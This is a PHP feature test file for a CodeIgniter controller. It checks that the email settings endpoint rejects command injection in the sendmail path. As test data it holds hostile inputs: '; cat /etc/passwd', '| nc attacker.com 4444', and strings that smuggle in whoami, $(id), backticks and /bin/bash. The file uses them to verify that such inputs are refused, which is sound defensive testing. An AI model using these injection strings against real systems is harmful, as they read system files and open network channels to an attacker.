<?php

namespace Tests\Controllers;

use CodeIgniter\Config\Services;
use CodeIgniter\Test\CIUnitTestCase;
use CodeIgniter\Test\DatabaseTestTrait;
use CodeIgniter\Test\FeatureTestTrait;

/**
 * @internal
 */
final class ConfigTest extends CIUnitTestCase
{
    use DatabaseTestTrait;
    use FeatureTestTrait;

    protected $migrate     = true;
    protected $migrateOnce = true;
    protected $refresh     = false;
    protected $namespace;

    protected function setUp(): void
    {
        parent::setUp();
    }

    protected function resetSession(): void
    {
        $session = Services::session();
        $session->destroy();
        $session->set('person_id', 1);
        $session->set('menu_group', 'office');
    }

    /**
     * Wrapper around FeatureTestTrait::post() that injects the admin
     * session via withSession() — Services::session() inside the
     * controller is a different instance from the one resetSession()
     * writes to, so the controller would otherwise see person_id=NULL
     * and Secure_Controller::__construct would redirect to /login + exit().
     */
    protected function postAsAdmin(string $url, array $data)
    {
        return $this
            ->withSession(['person_id' => 1, 'menu_group' => 'office'])
            ->post($url, $data);
    }

    // ========== Valid Mailpath Tests ==========

    public function testValidMailpathAcceptsStandardPath(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testValidMailpathAcceptsPathWithDots(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/local/bin/sendmail.local',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testValidMailpathAcceptsEmptyStringForNonSendmailProtocol(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'mail',
            'mailpath' => '',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSendmailProtocolRequiresMailpath(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    public function testNonSendmailProtocolRejectsMaliciousMailpath(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'smtp',
            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    // ========== Command Injection Prevention Tests ==========

    public function testMailpathRejectsCommandInjectionSemicolon(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    public function testMailpathRejectsCommandInjectionPipe(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail | nc attacker.com 4444',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpathRejectsCommandInjectionAnd(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail && whoami',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpathRejectsCommandInjectionBacktick(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/`whoami`',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpathRejectsCommandInjectionSubshell(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail$(id)',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpathRejectsCommandInjectionSpaceInPath(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail -t -i',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpathRejectsCommandInjectionNewline(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => "/usr/sbin/sendmail\n/bin/bash",
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpathRejectsCommandInjectionDollarSign(): void
    {
        $response = $this->postAsAdmin('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/$SENDMAIL',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }
}
